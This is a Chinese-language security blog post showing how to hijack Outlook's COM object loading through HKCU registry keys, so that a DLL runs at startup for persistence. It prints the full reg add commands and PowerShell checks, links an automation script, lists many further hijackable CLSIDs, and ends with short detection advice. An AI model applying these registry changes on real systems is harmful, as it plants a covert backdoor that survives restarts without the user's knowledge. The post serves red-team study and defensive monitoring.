---
layout: post
title: Use COM Object hijacking to maintain persistence——Hijack Outlook
---



## 0x00 前言
---

APT组织Trula使用的一个后门利用方法，通过COM劫持实现在Outlook启动时加载dll，特点是只需要当前用户的权限即可实现。

本文将参考公开的资料对这个方法进行测试，编写一个自动化利用脚本，扩展用法，分享多个可用的劫持位置，结合利用思路给出防御建议

参考资料：

https://www.welivesecurity.com/wp-content/uploads/2018/08/Eset-Turla-Outlook-Backdoor.pdf

## 0x01 简介
---

本文将要介绍以下内容：

- 利用方法
- Powershell脚本实现细节
- 扩展用法
- 防御建议

## 0x02 利用方法
---

Outlook在启动时会加载多个COM对象，我们可以通过修改注册表的方式劫持Outlook的启动过程，用来加载DLL

这里的利用方法需要添加两个注册表，修改两个COM对象

由于是修改HKCU的注册表，所以使用当前用户权限即可

### （1）COM对象1，用来加载第二个COM对象

添加如下注册表：

```
HKCU\Software\Classes\CLSID\{84DA0A92-25E0-11D3-B9F7-00C04F4C8F5D}\TreatAs = {49CBB1C7-97D1-485A-9EC1-A26065633066}
```

通过命令行实现的命令如下：

```
reg add HKCU\Software\Classes\CLSID\{84DA0A92-25E0-11D3-B9F7-00C04F4C8F5D}\TreatAs /t REG_SZ /d "{49CBB1C7-97D1-485A-9EC1-A26065633066}" /f
```

### （2）COM对象2，用来加载DLL

添加如下注册表：

```
HKCU\Software\Classes\CLSID\{49CBB1C7-97D1-485A-9EC1-A26065633066} = Mail Plugin
HKCU\Software\Classes\CLSID\{49CBB1C7-97D1-485A-9EC1-A26065633066}\InprocServer32 = [Path to the backdoor DLL]
HKCU\Software\Classes\CLSID\{49CBB1C7-97D1-485A-9EC1-A26065633066}\InprocServer32\ThreadingModel = Apartment
```

通过命令行实现的命令如下：

```
reg add HKCU\Software\Classes\CLSID\{49CBB1C7-97D1-485A-9EC1-A26065633066} /t REG_SZ /d "Mail Plugin" /f
reg add HKCU\Software\Classes\CLSID\{49CBB1C7-97D1-485A-9EC1-A26065633066}\InprocServer32 /t REG_SZ /d "c:\\test\\calc.dll" /f
reg add HKCU\Software\Classes\CLSID\{49CBB1C7-97D1-485A-9EC1-A26065633066}\InprocServer32 /v ThreadingModel /t REG_SZ /d "Apartment" /f
```

calc.dll可使用之前的测试DLL，地址为：https://github.com/3gstudent/test/blob/master/calc.dll

添加注册表后启动Outlook，多次加载DLL，弹出多个计算器，这里可以使用互斥量确保只弹出一个计算器，DLL的下载地址：

https://github.com/3gstudent/test/blob/master/calcmutex.dll

对于64位Windows系统，如果安装了32位的Office，两个COM对象的注册表位置需要修改为`HKCU\Software\Classes\Wow6432Node\CLSID\`

## 0x03 Powershell脚本实现细节
---

实现流程如下：

1. 判断操作系统位数
2. 判断Office软件版本
3. 如果是64位系统安装32位Office，注册表的位置为`HKCU\Software\Classes\Wow6432Node\CLSID\`，否则，注册表的位置为`HKCU\Software\Classes\CLSID\`
4. 添加对应注册表

具体代码如下：

#### 1. 判断操作系统位数

```
if ([IntPtr]::Size -eq 8)
{
    '64-bit'
}
else
{
    '32-bit'
}
```

#### 2. 判断安装office软件版本

查看默认安装路径`C:\Program Files\Microsoft Office`是否包含文件夹`MEDIA`

如果包含，那么为64位Office，否则为32位Office

powershell代码如下：

```
Try  
{  
	dir C:\Program Files\Microsoft Office\MEDIA
	Write-Host "Microsoft Office: 64-bit"
}
Catch  
{ 
	Write-Host "Microsoft Office: 32-bit"
}
```

实现代码已开源，地址如下：

https://github.com/3gstudent/Homework-of-Powershell/blob/master/Invoke-OutlookPersistence.ps1

代码实现了自动判断操作系统位数和Office软件版本，添加对应的注册表项

## 0x04 扩展用法
---

使用Process Monitor监控Outlook启动过程，查找是否有其他可用的COM对象

经测试，我在Outlook2013上找到多个可用方法

COM对象1替换成以下任意一个，COM对象2保持不变

可用的COM对象1：

- {B056521A-9B10-425E-B616-1FCD828DB3B1}
- {EFEF7FDB-0CED-4FB6-B3BB-3C50D39F4120}
- {93E5752E-B889-47C5-8545-654EE2533C64}
- {56FDF344-FD6D-11D0-958A-006097C9A090}
- {2163EB1F-3FD9-4212-A41F-81D1F933597F}
- {A6A2383F-AD50-4D52-8110-3508275E77F7}
- {F959DBBB-3867-41F2-8E5F-3B8BEFAA81B3}
- {88D96A05-F192-11D4-A65F-0040963251E5}
- {807583E5-5146-11D5-A672-00B0D022E945}
- {529A9E6B-6587-4F23-AB9E-9C7D683E3C50}
- {3CE74DE4-53D3-4D74-8B83-431B3828BA53}
- {A4B544A1-438D-4B41-9325-869523E2D6C7}
- {33C53A50-F456-4884-B049-85FD643ECFED}
- {C90250F3-4D7D-4991-9B69-A5C5BC1C2AE6}
- {275C23E2-3747-11D0-9FEA-00AA003F8646}
- {C15BB852-6F97-11D3-A990-00104B2A619F}
- {ED475410-B0D6-11D2-8C3B-00104B2A6676}
- {1299CF18-C4F5-4B6A-BB0F-2299F0398E27}
- {DCB00C01-570F-4A9B-8D69-199FDBA5723B}
- {C90250F3-4D7D-4991-9B69-A5C5BC1C2AE6}

## 0x05 防御建议
---

监控以下注册表项下的创建和修改操作：

- HKCU\Software\Classes\CLSID\
- HKCU\Software\Classes\Wow6432Node\CLSID\

## 0x06 小结
---

本文介绍了通过COM劫持实现在Outlook启动时加载dll的方法，分享多个可用的劫持位置，结合利用思路给出防御建议


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)








